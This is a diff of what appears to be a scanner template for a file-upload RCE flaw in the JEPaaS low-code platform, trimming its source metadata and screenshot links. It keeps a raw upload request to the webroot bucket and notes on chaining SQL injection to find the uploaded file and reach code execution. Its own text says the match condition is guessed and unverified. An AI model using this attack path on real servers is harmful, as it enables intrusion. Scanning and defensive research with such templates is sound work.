@@ -3,14 +3,8 @@ info:
   name: JEPaaS 低代码平台 documentfile 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gkh4fg5060achnh4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gkh4fg5060achnh4
-    fofa: icon_hash="-999810473"
 http:
 - raw:
   - 'POST /je/document/file?bucket=webroot HTTP/1.1
@@ -39,7 +33,6 @@ http:
 
     ------21909179191068471382830692394--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717035825894-27da46de-ffe7-469e-9c9c-d2032dd92a1c.png)
 
     文件上传后没有回显路径，需利用SQL注入 寻找上传路径，文件默认是上传至数据库: jepaas的 je_document_file表中（需根据实际环境调整）
 
@@ -48,11 +41,8 @@ http:
 
     找上传时间一致的文件
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717035826217-e3a81373-6cbe-4e60-801d-6dcd7dadfd5d.png)
 
-    RCE
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717035826510-78311df0-ba50-4d75-91ea-d23fc03fa8a4.png)'
+    RCE'
   redirects: false
   matchers:
   - status:
